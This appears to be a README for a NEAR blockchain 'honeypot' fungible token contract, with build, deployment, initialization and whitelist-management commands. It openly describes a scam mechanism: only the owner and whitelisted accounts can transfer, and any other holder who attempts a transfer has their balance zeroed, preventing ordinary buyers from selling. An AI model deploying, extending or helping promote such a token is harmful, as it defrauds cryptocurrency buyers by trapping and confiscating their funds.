# honeypot_token
an attemt at a honeypot token on near

> I have done local tests, not sure this will work, and working on other projects

---

## Building and deploying

```bash
cargo build
cargo near build
cargo near build reproducible-wasm
cargo near abi

cargo check
cargo test
cargo clean


cargo near deploy build-reproducible-wasm <account-id>
near deploy <account-id> <wasm/path>

```


---


### Token Methods

This contract implements the NEP-141 Fungible Token standard with the following methods:

#### Initialization

> **Note on Token Supply and Decimals:**
> - The token uses 24 decimal places for maximum precision
> - For 1 billion tokens, we specify 1,000,000,000 * 10^24 = 1,000,000,000,000,000,000,000,000,000 (1 followed by 27 zeros)
> - This means 1.0 tokens = 1,000,000,000,000,000,000,000,000 (1 followed by 24 zeros) yocto tokens

```bash

near deploy <account-id> target/near/fungible_token.wasm

# Initialize with default metadata
near call <contract-id> new_default_meta '{"owner_id": "<owner-account>", "total_supply": "1000000000000000000000000000000"}' --accountId <owner-account>

# Initialize with custom metadata
near call <contract-id> new '{"owner_id": "<owner-account>", "total_supply": "1000000000000000000000000000000", "metadata": {"spec": "ft-1.0.0", "name": "My Token", "symbol": "TOKEN", "icon": "data:image/svg+xml;base64,PHN2ZyBpZD0iU1VORlVOX1JPVU5EX0lDT04iIHZpZXdCb3g9IjAgMCAxMDgwIDEwODAiIHByZXNlcnZlQXNwZWN0UmF0aW89InhNaWRZTWlkIG1lZXQiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CiAgPHJlY3Qgd2lkdGg9IjEwODAiIGhlaWdodD0iMTA4MCIgZmlsbD0iI0IzOTU3MCIvPgogIDxjaXJjbGUgY3g9IjU0MCIgY3k9IjU0MCIgcj0iMzAwIiBmaWxsPSIjMzgyQzFGIiAvPgo8L3N2Zz4=", "decimals": 24}}' --accountId <owner-account>
```

> **Important Note on Token Transfers:**
> Only the owner and whitelisted accounts can perform successful transfers. All other accounts' balances will be automatically corrected to zero when they attempt transfers.

#### Core Methods

```bash
# View total supply
near view <contract-id> ft_total_supply

# View balance of an account
near view <contract-id> ft_balance_of '{"account_id": "<account-id>"}'  

# Transfer tokens
near call <contract-id> ft_transfer '{"receiver_id": "<receiver-account>", "amount": "<amount>"}' --accountId <sender-account>

# Transfer tokens with memo
near call <contract-id> ft_transfer '{"receiver_id": "<receiver-account>", "amount": "<amount>", "memo": "<memo>"}' --accountId <sender-account>
```

#### Storage Management

```bash
# Register account for receiving tokens
near call <contract-id> storage_deposit '' --accountId <account-id> --amount 0.00125

# View storage balance
near view <contract-id> storage_balance_of '{"account_id": "<account-id>"}'  

# Unregister account and withdraw storage deposit
near call <contract-id> storage_unregister '{"force": true}' --accountId <account-id>
```

#### Metadata

```bash
# View token metadata
near view <contract-id> ft_metadata
```

Note: Replace `<contract-id>`, `<account-id>`, `<owner-account>`, `<sender-account>`, `<receiver-account>`, and `<amount>` with actual values. The `--depositYocto 1` is required for transfers as a security measure.






#### Honeypot Methods

This token implements a honeypot mechanism where only the owner and whitelisted accounts can perform successful transfers. This allows the owner to manage liquidity pools while preventing regular users from selling their tokens.

```bash
# Add account to whitelist (owner only)
near call <contract-id> add_to_whitelist '{"account_id": "<account-id>"}' --accountId <owner-account>

# Remove account from whitelist (owner only)
near call <contract-id> remove_from_whitelist '{"account_id": "<account-id>"}' --accountId <owner-account>

# Check if account is whitelisted
near view <contract-id> is_whitelisted '{"account_id": "<account-id>"}'
```



---

copyright: 2025 by sleet.near, in partnership with huggies.near

